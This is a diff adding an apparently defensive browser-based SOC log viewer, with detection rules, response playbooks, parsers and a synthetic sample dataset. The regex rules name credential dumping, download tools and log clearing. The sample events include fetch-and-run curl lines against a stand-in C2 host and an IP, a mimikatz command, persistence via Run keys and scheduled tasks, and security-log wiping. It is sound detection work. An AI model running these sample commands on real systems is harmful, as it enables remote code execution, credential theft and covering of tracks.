+    <div class="nav-sep"></div>
+    <div class="nav-item" data-view="tools"><span>🛠 SOC Tools</span></div>
+    <div class="nav-item" data-view="notes"><span>📝 Analyst Notes</span></div>
+    <div class="nav-item" data-view="report"><span>▣ Incident Report</span></div>
+
+    <div class="nav-sep"></div>
+    <div class="sidebar-footer">Everything runs locally in your browser.<br>No data leaves this device, except optional Reputation → Live Lookup calls you trigger yourself.</div>
+  </div>
+
+  <div id="main">
+    <div id="topbar">
+      <div><span class="title">SOC Log Viewer</span><span class="sub" id="topSub">No logs loaded</span></div>
+      <div style="display:flex;gap:10px;align-items:center;">
+        <span class="pill" id="topPill">OFFLINE · RULE-BASED</span>
+        <div class="session-menu">
+          <button class="btn ghost" id="sessionBtn">Session</button>
+          <div class="session-dropdown hidden" id="sessionDropdown"></div>
+        </div>
+        <button class="btn ghost" id="exportBtn">Export CSV</button>
+        <button class="btn ghost" id="resetBtn">Clear</button>
+      </div>
+    </div>
+
+    <div id="content">
+
+      <!-- ============ UPLOAD ============ -->
+      <div class="view" id="view-upload">
+        <div class="dropzone" id="dropzone">
+          <div style="font-size:30px;">🖥</div>
+          <h3>Drop log files to get started</h3>
+          <p>Multiple files merged automatically · JSON array, newline-delimited JSON, or CSV — parsed entirely in your browser · Qualys FIM exports are auto-detected</p>
+          <div class="fmt-row">
+            <span class="fmt-chip">JSON</span><span class="fmt-chip">CSV</span><span class="fmt-chip">Syslog/Text</span>
+            <span class="fmt-chip">CrowdStrike</span><span class="fmt-chip">Panther</span><span class="fmt-chip">Sentinel</span><span class="fmt-chip">Splunk</span><span class="fmt-chip">QRadar</span><span class="fmt-chip">Qualys FIM</span>
+          </div>
+          <div class="upload-actions">
+            <button class="btn" id="browseBtn">Browse files</button>
+            <button class="btn ghost" id="sampleBtn">Load sample dataset</button>
+            <button class="btn ghost" id="fimSampleBtn">Load Qualys FIM sample</button>
+          </div>
+          <input type="file" id="fileInput" accept=".json,.csv,.txt,.log" multiple>
+        </div>
+        <div class="panel" style="margin-top:16px;">
+          <h4>Or paste logs directly</h4>
+          <textarea id="pasteBox" placeholder='[{"event_time":"2026-07-04T11:30:04Z","UserName":"admin","ComputerName":"WIN-DC01","CommandLine":"powershell -enc JAB..."}]'></textarea>
+          <div class="upload-actions" style="margin-top:10px;">
+            <button class="btn" id="loadPasteBtn">Load pasted logs</button>
+            <button class="btn ghost" id="clearPasteBtn">Clear</button>
+          </div>
+        </div>
+        <div class="empty-state" id="uploadError"></div>
+      </div>
+
+      <!-- ============ DASHBOARD ============ -->
+      <div class="view hidden" id="view-dashboard">
+        <div class="kpi-row" id="kpiRow"></div>
+        <div class="grid2">
+          <div class="panel">
+            <h4>Detections by MITRE Tactic</h4>
+            <div id="tacticBars"></div>
+          </div>
+          <div class="panel">
+            <h4>Severity Composition</h4>
+            <div id="sevBars"></div>
+            <div class="sev-legend">
+              <span><i class="sw" style="background:var(--crit)"></i>Critical</span>
+              <span><i class="sw" style="background:var(--high)"></i>High</span>
+              <span><i class="sw" style="background:var(--med)"></i>Medium</span>
+              <span><i class="sw" style="background:var(--low)"></i>Low</span>
+            </div>
+          </div>
+        </div>
+        <div class="panel">
+          <h4>Top Detections</h4>
+          <div class="det-grid" id="topDetections"></div>
+        </div>
+      </div>
+
+      <!-- ============ NETWORK ============ -->
+      <div class="view hidden" id="view-network">
+        <div class="view-head"><div><h2>Network</h2><p>Source → destination flows, sized by frequency. Red nodes co-occurred with a fired detection.</p></div></div>
+        <div class="panel"><div id="networkWrap"></div></div>
+      </div>
+
+      <!-- ============ URLS & DOMAINS ============ -->
+      <div class="view hidden" id="view-urls">
+        <div class="view-head"><div><h2>URLs &amp; Domains</h2><p>Every domain and URL seen in the loaded logs, defanged for safe sharing.</p></div></div>
+        <div class="panel" id="urlsWrap"></div>
+      </div>
+
+      <!-- ============ PROCESS ============ -->
+      <div class="view hidden" id="view-process">
+        <div class="view-head"><div><h2>Process</h2><p>Unique processes observed, with parent relationships and detection overlap.</p></div></div>
+        <div class="panel" id="processWrap"></div>
+      </div>
+
+      <!-- ============ TREE (network graph alt) ============ -->
+      <div class="view hidden" id="view-tree">
+        <div class="view-head"><div><h2>Tree</h2><p>Source/destination IP relationship graph. Click a node to trace its path.</p></div></div>
+        <div class="panel" style="overflow-x:auto;"><div id="treeGraphWrap"></div></div>
+      </div>
+
+      <!-- ============ LOG TABLE ============ -->
+      <div class="view hidden" id="view-table">
+        <div class="toolbar">
+          <input type="text" id="tableSearch" placeholder="Filter by any field (user, host, ip, domain, hash, command...)">
+          <select id="sevFilter">
+            <option value="">All severities</option>
+            <option>CRITICAL</option><option>HIGH</option><option>MEDIUM</option><option>LOW</option>
+          </select>
+          <select id="presetSelect"><option value="">Saved filters…</option></select>
+          <button class="btn ghost sm" id="savePresetBtn">Save filter</button>
+        </div>
+        <div class="table-wrap">
+          <table id="logTable">
+            <thead><tr>
+              <th data-k="time">Time (UTC)</th><th data-k="severity">Severity</th><th data-k="host">Host</th><th data-k="user">User</th><th data-k="process">Process</th><th data-k="parent">Parent</th>
+              <th>Command Line</th><th data-k="src_ip">Src IP</th><th data-k="dst_ip">Dst IP</th><th data-k="dst_port">Port</th><th data-k="proto">Proto</th><th data-k="domain">Domain</th><th>Technique</th>
+            </tr></thead>
+            <tbody id="tableBody"></tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- ============ DETECTIONS ============ -->
+      <div class="view hidden" id="view-detections">
+        <div class="section-title"><span>Fired Detection Rules</span><div class="line"></div></div>
+        <div class="kbd-hint"><kbd>j</kbd>/<kbd>k</kbd> move focus · <kbd>a</kbd> acknowledge focused finding &nbsp;·&nbsp;
+          <label style="cursor:pointer;"><input type="checkbox" id="showAckedChk"> show acknowledged</label></div>
+        <div class="det-grid" id="detGrid"></div>
+      </div>
+
+      <!-- ============ CORRELATIONS ============ -->
+      <div class="view hidden" id="view-correlations">
+        <div class="view-head"><div><h2>Correlations</h2><p>Multi-event patterns: chains, bursts, rare-baseline execution, lateral sweeps, watchlist hits, and impossible travel (needs IP intel).</p></div></div>
+        <div class="kpi-row" id="corrKpiRow" style="grid-template-columns:repeat(4,1fr);"></div>
+        <div id="corrWrap"></div>
+      </div>
+
+      <!-- ============ ALERT RULES ============ -->
+      <div class="view hidden" id="view-rules">
+        <div class="view-head"><div><h2>Alert Rules</h2><p>Rule pack applied to every loaded event. Disable a rule to exclude it from detections.</p></div></div>
+        <div class="panel">
+          <div class="rule-row" style="border-bottom:1px solid var(--border);color:var(--text-faint);font-size:10.5px;text-transform:uppercase;">
+            <span>Rule</span><span>Tactic</span><span>Technique</span><span>Severity</span><span>Enabled</span>
+          </div>
+          <div id="rulesWrap"></div>
+        </div>
+      </div>
+
+      <!-- ============ UEBA ============ -->
+      <div class="view hidden" id="view-ueba">
+        <div class="view-head"><div><h2>UEBA — Behavior Analytics</h2><p>Per-entity risk scoring computed locally from loaded logs.</p></div></div>
+        <div class="kpi-row" id="uebaKpiRow" style="grid-template-columns:repeat(5,1fr);"></div>
+        <div class="ueba-tabs">
+          <div class="ueba-tab active" data-utab="users">Users</div>
+          <div class="ueba-tab" data-utab="hosts">Hosts</div>
+        </div>
+        <div class="panel">
+          <div class="user-row" style="border-bottom:1px solid var(--border);color:var(--text-faint);font-size:10.5px;text-transform:uppercase;">
+            <span>Entity</span><span>Risk</span><span>Score</span><span>Signals</span>
+          </div>
+          <div id="userRows"></div>
+        </div>
+      </div>
+
+      <!-- ============ ATTACK STORY ============ -->
+      <div class="view hidden" id="view-story">
+        <div class="view-head"><div><h2>Attack Story</h2><p>Flagged events correlated per entity into chronological chains.</p></div></div>
+        <div class="kpi-row" id="storyKpiRow" style="grid-template-columns:repeat(3,1fr);"></div>
+        <div id="timelineWrap"></div>
+      </div>
+
+      <!-- ============ HUNT PACK ============ -->
+      <div class="view hidden" id="view-hunt">
+        <div class="view-head"><div><h2>Hunt Pack</h2><p>Hypothesis-driven proactive hunts, evaluated against the loaded dataset.</p></div></div>
+        <div id="huntWrap"></div>
+      </div>
+
+      <!-- ============ PROCESS TREE ============ -->
+      <div class="view hidden" id="view-ptree">
+        <div class="view-head"><div><h2>Process Tree</h2><p>Parent → child execution chains, grouped by host, in time order.</p></div></div>
+        <div class="panel" id="ptreeWrap"></div>
+      </div>
+
+      <!-- ============ FILE INTEGRITY MONITORING (FIM) ============ -->
+      <div class="view hidden" id="view-fim">
+        <div class="view-head"><div><h2>File Integrity Monitoring</h2><p>Upload a Qualys FIM export and this explains, in plain English, what each flagged change means and what to do about it.</p></div></div>
+        <div class="kpi-row" id="fimKpiRow" style="grid-template-columns:repeat(6,1fr);margin-bottom:20px;"></div>
+        <div class="section-title"><span>What happened &amp; what to do</span><div class="line"></div></div>
+        <div id="fimFindingsWrap" style="margin-bottom:26px;"></div>
+        <div class="section-title"><span>All FIM events</span><div class="line"></div></div>
+        <div class="table-wrap">
+          <table id="fimTable">
+            <thead><tr>
+              <th>Time (UTC)</th><th>Severity</th><th>Host</th><th>User</th><th>Action</th><th>File / Path</th><th>Reputation</th><th>Trust</th><th>Matched rule</th>
+            </tr></thead>
+            <tbody id="fimTableBody"></tbody>
+          </table>
+        </div>
+        <footer class="note">Qualys FIM logs (JSON or CSV export) are auto-detected on upload by their distinctive fields (Absolute File Path, File Reputation Status, File Trust Status, Rules Name) — no need to tell the app what format it is. Explanations and recommended actions are generated locally from a built-in rule pack; they're a starting point for triage, not a substitute for your own investigation or Qualys' own incident workflow.</footer>
+      </div>
+
+      <!-- ============ WATCHLISTS & INTEL ============ -->
+      <div class="view hidden" id="view-watchlists">
+        <div class="view-head"><div><h2>Watchlists &amp; Intel</h2><p>Paste your own known-bad indicators and optional IP → country/ASN mapping. Everything here stays in this browser tab.</p></div></div>
+        <div class="intel-grid">
+          <div class="panel">
+            <h4>Watchlist — IPs &amp; domains (one per line)</h4>
+            <textarea class="intel-input" id="wlInput" placeholder="185.220.101.5&#10;evil-c2.example&#10;10.0.0.66"></textarea>
+            <div class="upload-actions" style="justify-content:flex-start;margin-top:10px;">
+              <button class="btn" id="wlApplyBtn">Apply watchlist</button>
+              <button class="btn ghost" id="wlClearBtn">Clear</button>
+            </div>
+            <div id="wlStatus" style="margin-top:10px;font-size:11.5px;color:var(--text-faint);"></div>
+          </div>
+          <div class="panel">
+            <h4>IP Intel — CSV: ip,country,asn</h4>
+            <textarea class="intel-input" id="intelInput" placeholder="185.220.101.5,Romania,AS201814&#10;10.0.0.1,Internal,-"></textarea>
+            <div class="upload-actions" style="justify-content:flex-start;margin-top:10px;">
+              <button class="btn" id="intelApplyBtn">Apply intel</button>
+              <button class="btn ghost" id="intelClearBtn">Clear</button>
+            </div>
+            <div id="intelStatus" style="margin-top:10px;font-size:11.5px;color:var(--text-faint);"></div>
+          </div>
+        </div>
+        <footer class="note">Watchlist matches add a CRITICAL "Watchlist hit" correlation. IP intel enables the impossible-travel correlation (a user seen from 2+ distinct countries within 4 hours) and annotates IPs in SOC Tools. Loading, scoring, and correlating logs here never makes a network call — the only feature in this app that does is the optional Live Lookup in the Reputation view, and only when you click it.</footer>
+      </div>
+
+      <!-- ============ REPUTATION ============ -->
+      <div class="view hidden" id="view-reputation">
+        <div class="view-head"><div><h2>Reputation</h2><p>Every IP, domain, and URL in your logs, scored offline by heuristics — with optional live lookups against public threat-intel APIs.</p></div></div>
+        <div class="panel" style="margin-bottom:18px;">
+          <h4>Live Lookup settings (optional)</h4>
+          <div class="rep-settings">
+            <div><label>VirusTotal API key</label><input type="password" id="vtKeyInput" placeholder="paste your VT API key"></div>
+            <div><label>AbuseIPDB API key</label><input type="password" id="abuseKeyInput" placeholder="paste your AbuseIPDB API key"></div>
+            <label class="chk"><input type="checkbox" id="rememberKeysChk"> remember in this browser</label>
+            <button class="btn ghost" id="applyRepKeysBtn">Apply keys</button>
+          </div>
+          <div id="repKeyStatus" style="font-size:11.5px;color:var(--text-faint);margin-top:4px;"></div>
+          <footer class="note" style="margin-top:12px;">Keys are used only to call VirusTotal/AbuseIPDB directly from your browser when you click a lookup button — they're never sent anywhere else, never included in exported sessions/reports, and (unless you check "remember") are cleared on reload. URLhaus needs no key. Some providers block direct browser requests (CORS); if a lookup fails immediately, that's the likely cause — their own website will still work.</footer>
+        </div>
+        <div class="panel" style="margin-bottom:18px;">
+          <h4>Check your own indicators</h4>
+          <p style="color:var(--text-faint);font-size:11.5px;margin:0 0 10px;">Paste any mix of IPs, domains, and URLs — one per line. Type is auto-detected. These are scored the same way as indicators from your logs, and work even with no logs loaded.</p>
+          <textarea class="intel-input" id="manualRepInput" style="min-height:100px;" placeholder="185.220.101.5&#10;evil-c2.example&#10;https://evil-c2.example/gate.php"></textarea>
+          <div class="upload-actions" style="justify-content:flex-start;margin-top:10px;">
+            <button class="btn" id="manualRepScoreBtn">Score indicators</button>
+            <button class="btn ghost" id="manualRepClearBtn">Clear</button>
+          </div>
+          <div id="manualRepWrap"></div>
+        </div>
+        <div id="repWrap"></div>
+      </div>
+
+      <!-- ============ CUSTOM RULES (SIGMA) ============ -->
+      <div class="view hidden" id="view-customrules">
+        <div class="view-head"><div><h2>Custom Rules — Sigma Import</h2><p>Paste a Sigma rule to compile it into this app's detection pack. Supports AND-only <code>condition: selection</code>, with contains / startswith / endswith / re modifiers.</p></div></div>
+        <div class="grid2" style="grid-template-columns:1fr 1fr;">
+          <div class="panel">
+            <h4>Paste Sigma YAML</h4>
+            <textarea class="sigma-input" id="sigmaInput" placeholder="title: Certutil Download&#10;id: custom-certutil&#10;level: medium&#10;logsource:&#10;  category: process_creation&#10;detection:&#10;  selection:&#10;    CommandLine|contains:&#10;      - '-urlcache'&#10;      - '-decode'&#10;    Image|endswith: 'certutil.exe'&#10;  condition: selection&#10;tags:&#10;  - attack.command_and_control&#10;  - attack.t1105"></textarea>
+            <div class="upload-actions" style="justify-content:flex-start;margin-top:10px;">
+              <button class="btn" id="sigmaCompileBtn">Compile &amp; add rule</button>
+              <button class="btn ghost" id="sigmaClearBtn">Clear</button>
+            </div>
+            <div id="sigmaResult"></div>
+          </div>
+          <div class="panel">
+            <h4>Active custom rules</h4>
+            <div id="customRulesWrap"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ============ RULE TESTS ============ -->
+      <div class="view hidden" id="view-ruletests">
+        <div class="view-head"><div><h2>Rule Tests</h2><p>Fixture events with known-expected outcomes, run against the live rule pack — catches false positives/negatives before you trust a rule change.</p></div></div>
+        <div class="kpi-row" id="testKpiRow" style="grid-template-columns:repeat(3,1fr);"></div>
+        <div class="panel">
+          <div class="test-row" style="border-bottom:1px solid var(--border);color:var(--text-faint);font-size:10.5px;text-transform:uppercase;">
+            <span>Fixture</span><span>Expected</span><span>Result</span>
+          </div>
+          <div id="testRows"></div>
+        </div>
+      </div>
+
+      <!-- ============ QUERY BUILDERS ============ -->
+      <div class="view hidden" id="view-qb-crowdstrike"><div id="qb-mount-crowdstrike"></div></div>
+      <div class="view hidden" id="view-qb-panther"><div id="qb-mount-panther"></div></div>
+      <div class="view hidden" id="view-qb-splunk"><div id="qb-mount-splunk"></div></div>
+      <div class="view hidden" id="view-qb-sentinel"><div id="qb-mount-sentinel"></div></div>
+      <div class="view hidden" id="view-qb-qradar"><div id="qb-mount-qradar"></div></div>
+      <div class="view hidden" id="view-qb-s1"><div id="qb-mount-s1"></div></div>
+
+      <!-- ============ MITRE MATRIX ============ -->
+      <div class="view hidden" id="view-mitre">
+        <div class="view-head"><div><h2>MITRE ATT&amp;CK Coverage</h2><p>Detection rule pack mapped to tactics observed in the loaded logs.</p></div></div>
+        <div class="matrix" id="mitreMatrix"></div>
+      </div>
+
+      <!-- ============ SOC TOOLS ============ -->
+      <div class="view hidden" id="view-tools">
+        <div class="view-head"><div><h2>SOC Tools</h2><p>From your logs — click any value to send it into a tool.</p></div></div>
+        <div id="toolsWrap"></div>
+      </div>
+
+      <!-- ============ NOTES ============ -->
+      <div class="view hidden" id="view-notes">
+        <div class="view-head"><div><h2>Analyst Notes</h2><p>Freeform scratchpad for this session. Not saved between reloads.</p></div></div>
+        <textarea id="notesArea" placeholder="Working notes, hypotheses, escalation contacts, timeline of your own analysis..."></textarea>
+      </div>
+
+      <!-- ============ INCIDENT REPORT ============ -->
+      <div class="view hidden" id="view-report">
+        <div style="display:flex;justify-content:flex-end;gap:8px;margin-bottom:12px;">
+          <button class="btn ghost" onclick="exportMitreNavigator()">Export ATT&amp;CK Navigator layer</button>
+          <button class="btn ghost" onclick="exportStixBundle()">Export STIX 2.1 bundle</button>
+          <button class="btn" onclick="window.print()">Print / Save as PDF</button>
+        </div>
+        <div class="report-layout">
+          <div class="report-toc">
+            <div class="eyebrow">Contents</div>
+            <a href="#rsec-summary">1 · Executive Summary</a>
+            <a href="#rsec-timeline">2 · Incident Timeline</a>
+            <a href="#rsec-chains">3 · Correlated Attack Chains</a>
+            <a href="#rsec-corr">4 · Cross-Event Correlations</a>
+            <a href="#rsec-findings">5 · Detection Findings</a>
+            <a href="#rsec-mitre">6 · MITRE ATT&amp;CK Coverage</a>
+            <a href="#rsec-ueba">7 · Behavioral Risk (UEBA)</a>
+            <a href="#rsec-hunt">8 · Threat-Hunt Findings</a>
+            <a href="#rsec-assets">9 · Affected Assets</a>
+            <a href="#rsec-ioc">10 · Indicators of Compromise</a>
+            <a href="#rsec-actions">11 · Recommended Actions</a>
+          </div>
+          <div class="report-body" id="reportBody"></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<script>
+let RAW_EVENTS = [];
+let DET_HITS   = [];
+let disabledRules = new Set();
+let ackedRuleIds = new Set();
+let showAcked = false;
+let focusedDetIndex = -1;
+let CORR_HITS = [];
+let wlIps = [], wlDomains = [];
+let ipIntel = {};   // ip -> {country, asn}
+let filterPresets = [];
+try{ filterPresets = JSON.parse(localStorage.getItem("soc_filter_presets")||"[]"); }catch(e){ filterPresets = []; }
+
+/* ================= RULES ================= */
+const RULES = [
+  { id:"enc_powershell", title:"Encoded / obfuscated PowerShell", tactic:"Execution", technique:"T1059.001", severity:"HIGH",
+    test:e => /powershell/i.test(e.process||"") && /-enc|-encodedcommand|-e[a-z]{0,10}\s|hidden|noni|nop\b/i.test(e.cmd||"") },
+  { id:"lsass_dump", title:"LSASS access / credential dumping", tactic:"Credential Access", technique:"T1003.001", severity:"CRITICAL",
+    test:e => /mimikatz|sekurlsa|lsass\.exe.*dump|procdump.*lsass/i.test(e.cmd||"") || /privilege::debug/i.test(e.cmd||"") },
+  { id:"psexec", title:"PsExec / admin-share execution", tactic:"Lateral Movement", technique:"T1021.002", severity:"HIGH",
+    test:e => /psexec|paexec/i.test(e.process||"") || /\\\\[\w.-]+\\(admin\$|c\$|ipc\$)/i.test(e.cmd||"") },
+  { id:"reg_run_persist", title:"Registry Run-key persistence", tactic:"Persistence", technique:"T1547.001", severity:"HIGH",
+    test:e => /reg(\.exe)?\s+add.*\\(run|runonce)\b/i.test(e.cmd||"") },
+  { id:"sched_task_persist", title:"Scheduled task persistence", tactic:"Persistence", technique:"T1053.005", severity:"MEDIUM",
+    test:e => /schtasks.*\/create/i.test(e.cmd||"") },
+  { id:"lolbin_download", title:"Certutil / curl / bitsadmin download", tactic:"Command and Control", technique:"T1105", severity:"MEDIUM",
+    test:e => /certutil.*-urlcache|certutil.*-decode|bitsadmin.*\/transfer|curl\s+-o\s|curl\s+.*-outfile/i.test(e.cmd||"") },
+  { id:"discovery_cmds", title:"Host & domain recon commands", tactic:"Discovery", technique:"T1082 / T1087", severity:"LOW",
+    test:e => /whoami(\s+\/all)?$|net\s+user\s+\/domain|net\s+localgroup|systeminfo|ipconfig\s+\/all|nltest/i.test((e.cmd||"").trim()) },
+  { id:"susp_child", title:"Suspicious child of system process", tactic:"Execution", technique:"T1055 / T1036", severity:"HIGH",
+    test:e => /^(services\.exe|winlogon\.exe|lsass\.exe|explorer\.exe)$/i.test(e.parent||"") && /^(cmd\.exe|powershell\.exe|mshta\.exe|rundll32\.exe)$/i.test(e.process||"") },
+  { id:"wmi_winrm", title:"WMI / WinRM remote execution", tactic:"Lateral Movement", technique:"T1047 / T1021.006", severity:"MEDIUM",
+    test:e => /wmic\s+.*process\s+call\s+create|invoke-wmimethod|invoke-command\s+-computername/i.test(e.cmd||"") },
+  { id:"susp_port", title:"Connection on suspicious port", tactic:"Command and Control", technique:"T1571", severity:"MEDIUM",
+    test:e => e.dst_port && [4444,1337,31337,6667,8081,8082].includes(Number(e.dst_port)) },
+  { id:"susp_tld_dns", title:"DNS to suspicious TLD / dynamic DNS", tactic:"Command and Control", technique:"T1071.004", severity:"MEDIUM",
+    test:e => /\.(xyz|top|tk|zip|gq|cf|ml|ga)$/i.test((e.domain||"").trim()) },
+  { id:"cleartext_pw", title:"Clear-text password in command line", tactic:"Credential Access", technique:"T1552.001", severity:"HIGH",
+    test:e => /-p\s+\S+|password[=:]\S+|\/user:\S+\s+\/pass(word)?:\S+/i.test(e.cmd||"") },
+  { id:"clear_logs", title:"Event log clearing", tactic:"Defense Evasion", technique:"T1070.001", severity:"HIGH",
+    test:e => /wevtutil\s+cl|clear-eventlog|del\s+.*\.evtx/i.test(e.cmd||"") },
+  { id:"exfil_paste", title:"Possible exfil to paste / file-share site", tactic:"Exfiltration", technique:"T1567", severity:"MEDIUM",
+    test:e => /pastebin\.com|transfer\.sh|anonfiles|file\.io/i.test(e.domain||"") },
+];
+RULES.forEach(r=>{ r.desc = r.test.toString().replace(/^e\s*=>\s*/,"").replace(/\s+/g," ").trim(); });
+
+const PLAYBOOKS = {
+  enc_powershell:"Decode the -enc payload offline, identify what it executed, isolate the host, and reset credentials used in that session.",
+  lsass_dump:"Isolate the host immediately, force a domain-wide credential reset, and treat every credential on that box as compromised.",
+  psexec:"Confirm whether this was authorized admin tooling. If not, disable the account, audit admin-share usage across the environment, and check for lateral spread.",
+  reg_run_persist:"Remove the Run-key entry, quarantine the referenced binary, and check other hosts touched by the same user/account for the same key.",
+  sched_task_persist:"Delete the scheduled task, retrieve and analyze the referenced binary, and check Task Scheduler history for related entries.",
+  lolbin_download:"Block the destination domain/IP, retrieve the downloaded file for analysis, and audit other hosts for the same LOLBin usage pattern.",
+  discovery_cmds:"Usually low severity alone — correlate with later-stage activity from the same user/host before escalating.",
+  susp_child:"Capture a memory image if possible, this pattern often indicates process injection; isolate and investigate the parent process.",
+  wmi_winrm:"Confirm this was authorized remote administration. If not, audit WinRM/WMI permissions and rotate credentials used for the session.",
+  susp_port:"Block the port at the perimeter/host firewall and identify what process opened the connection.",
+  susp_tld_dns:"Add the domain to your blocklist and check DNS logs across the environment for other hosts resolving it.",
+  cleartext_pw:"Rotate the exposed credential immediately and identify who/what logged the command line (EDR retains CLI args in plaintext).",
+  clear_logs:"Treat this as a strong Defense Evasion signal — pull logs from a central SIEM/forwarder if available, and assume the attacker is trying to hide other activity on this host.",
+  exfil_paste:"Identify what data was uploaded before the connection is blocked, and notify the data owner if sensitive information may have left the environment.",
+};
+RULES.forEach(r=>{ r.playbook = PLAYBOOKS[r.id] || "Review the matching events, confirm intent with the account owner, and escalate per your IR runbook if unauthorized."; });
+
+const sevColor = {CRITICAL:"var(--crit)",HIGH:"var(--high)",MEDIUM:"var(--med)",LOW:"var(--low)"};
+const sevWeight = {CRITICAL:40,HIGH:15,MEDIUM:5,LOW:1};
+
+/* ================= SAMPLE DATA ================= */
+function buildSampleData(){
+  const srcIps=["10.0.0.1","10.0.0.2","10.0.0.3","10.0.0.4","10.0.0.5","10.0.0.6","10.0.0.7"];
+  const dstIps=["8.8.8.8","1.1.1.1","91.108.4.10","185.220.101.5","104.21.48.1","172.217.16.46"];
+  const domains=["update.microsoft.com","login.windows.net","evil-c2.example","raw.githubusercontent.com","cdn.discordapp.com","pastebin.com"];
+  const hosts=["WIN-DC01","WIN-FIN02","WIN-SRV08","WIN-WS42","WIN-HR03","LINUX-APP01"];
+  const users=["admin","bob.admin","jane.doe","root","guest","administrator","svc_backup","mwilson","jsmith"];
+  const protos=["TCP","UDP","HTTP","HTTPS","DNS","SMB","RDP","LDAP"];
+  const evts=[];
+  let t = new Date("2026-07-03T22:47:05Z").getTime();
+  const push = (o) => { evts.push(Object.assign({event_time:new Date(t).toISOString(), src_ip:srcIps[Math.floor(Math.random()*srcIps.length)], dst_ip:dstIps[Math.floor(Math.random()*dstIps.length)], dst_port:443, src_port:40000+Math.floor(Math.random()*20000), proto:protos[Math.floor(Math.random()*protos.length)], domain:domains[Math.floor(Math.random()*domains.length)], severity:"LOW"}, o)); t += 1000*60*Math.floor(Math.random()*90+5); };
+
+  const chain = [
+    {host:"WIN-SRV08",user:"jsmith",parent:"explorer.exe",process:"cmd.exe",cmd:"whoami /all",severity:"LOW"},
+    {host:"WIN-SRV08",user:"jsmith",parent:"cmd.exe",process:"net.exe",cmd:"net user /domain",severity:"LOW"},
+    {host:"WIN-WS42",user:"jsmith",parent:"services.exe",process:"cmd.exe",cmd:"cmd /c whoami /all",severity:"HIGH"},
+    {host:"WIN-FIN02",user:"jsmith",parent:"schtasks.exe",process:"curl.exe",cmd:"curl -o payload.exe https://evil-c2.example/gate.php",severity:"MEDIUM",dst_ip:"91.108.4.10",domain:"evil-c2.example",dst_port:443,url:"https://evil-c2.example/gate.php"},
+    {host:"WIN-DC01",user:"admin",parent:"explorer.exe",process:"cmd.exe",cmd:"powershell -enc JABjAG0AZAAg...",severity:"HIGH",dst_ip:"8.8.8.8",domain:"evil-c2.example"},
+    {host:"WIN-FIN02",user:"jsmith",parent:"schtasks.exe",process:"curl.exe",cmd:"curl -o payload.exe https://evil-c2.example/gate.php",severity:"MEDIUM",dst_ip:"91.108.4.10",domain:"evil-c2.example"},
+    {host:"LINUX-APP01",user:"svc_backup",parent:"winlogon.exe",process:"psexec.exe",cmd:"mimikatz privilege::debug",severity:"CRITICAL",dst_ip:"91.108.4.10",dst_port:3389,domain:"raw.githubusercontent.com",hash:"18ac3e7343f016890c510e93f935261169d9e3f565436429830faf0934f4f8e4"},
+    {host:"WIN-HR03",user:"jsmith",parent:"services.exe",process:"reg.exe",cmd:"reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Users\\Public\\upd.exe",severity:"HIGH"},
+    {host:"WIN-FIN02",user:"bob.admin",parent:"cmd.exe",process:"schtasks.exe",cmd:"schtasks /create /tn Update /tr backdoor.exe /sc onlogon",severity:"MEDIUM"},
+    {host:"WIN-DC01",user:"administrator",parent:"cmd.exe",process:"wmic.exe",cmd:"wmic /node:WIN-FIN02 process call create cmd.exe",severity:"MEDIUM"},
+    {host:"WIN-SRV08",user:"guest",parent:"explorer.exe",process:"cmd.exe",cmd:"systeminfo",severity:"LOW",dst_ip:"1.1.1.1"},
+    {host:"LINUX-APP01",user:"root",parent:"sshd",process:"bash",cmd:"curl -o /tmp/x http://185.220.101.5/x.sh && chmod +x /tmp/x && /tmp/x",severity:"HIGH",dst_ip:"185.220.101.5",domain:"pastebin.com",url:"http://185.220.101.5/x.sh"},
+    {host:"WIN-DC01",user:"admin",parent:"cmd.exe",process:"wevtutil.exe",cmd:"wevtutil cl Security",severity:"HIGH"},
+  ];
+  chain.forEach(c=>push(c));
+
+  for(let i=0;i<45;i++){
+    push({host:hosts[Math.floor(Math.random()*hosts.length)], user:users[Math.floor(Math.random()*users.length)],
+          parent:"svchost.exe",process:"MsMpEng.exe", cmd:"", severity:"LOW", dst_port:[443,80,53,445,25][Math.floor(Math.random()*5)]});
+  }
+  return evts;
+}
+
+/* ================= PARSE / NORMALIZE ================= */
+function normalizeEvent(raw){
+  const g = (...keys) => { for(const k of keys){ if(raw[k]!==undefined && raw[k]!==null && raw[k]!=="") return raw[k]; } return ""; };
+  return {
+    time: g("event_time","Time","timestamp","@timestamp","EventTime"),
+    host: g("ComputerName","host","Host","hostname","dvc"),
+    user: g("UserName","user","User","src_user","account"),
+    parent: g("ParentBaseFileName","ParentImage","parent","ParentProcess"),
+    process: g("FileName","process","Process","Image","ProcessName"),
+    cmd: g("CommandLine","cmd","command_line","commandline"),
+    hash: g("SHA256HashData","hash","sha256","FileHash"),
+    src_ip: g("src_ip","SourceIP","srcip","source_ip"),
+    src_port: g("src_port","SourcePort","srcport"),
+    dst_ip: g("dst_ip","RemoteAddressIP4","DestinationIP","dstip","dest_ip"),
+    dst_port: g("dst_port","DestinationPort","dstport"),
+    proto: g("proto","Protocol","transport"),
+    domain: g("domain","Domain","query","dest_domain"),
+    url: g("url","URL","request_url"),
+    severity: (g("severity","Severity","LogLevel") || "LOW").toString().toUpperCase(),
+  };
+}
+
+function parseInput(text, filename){
+  filename = filename || "";
+  text = text.trim();
+  let items = [];
+  try{
+    if(text.startsWith("[")){
+      items = JSON.parse(text);
+    } else if(text.startsWith("{") && text.includes("}\n{")){
+      items = text.split("\n").filter(Boolean).map(l=>JSON.parse(l));
+    } else if(text.startsWith("{")){
+      items = [JSON.parse(text)];
+    } else if(filename.toLowerCase().endsWith(".csv") || text.split("\n")[0].includes(",")){
+      items = parseCSV(text);
+    } else {
+      items = text.split("\n").filter(Boolean).map(l=>{ try{return JSON.parse(l);}catch(e){return null;} }).filter(Boolean);
+    }
+  }catch(e){
+    try{ items = parseCSV(text); } catch(e2){ throw new Error("Could not parse file as JSON or CSV."); }
+  }
+  if(!Array.isArray(items) || items.length===0) throw new Error("No events found in the supplied data.");
+  return items;
+}
+
+function parseCSV(text){
+  const lines = text.trim().split(/\r?\n/);
+  const headers = lines[0].split(",").map(h=>h.trim().replace(/^"|"$/g,""));
+  return lines.slice(1).filter(Boolean).map(line=>{
+    const vals = line.split(",").map(v=>v.trim().replace(/^"|"$/g,""));
+    const obj = {};
+    headers.forEach((h,i)=> obj[h]=vals[i]);
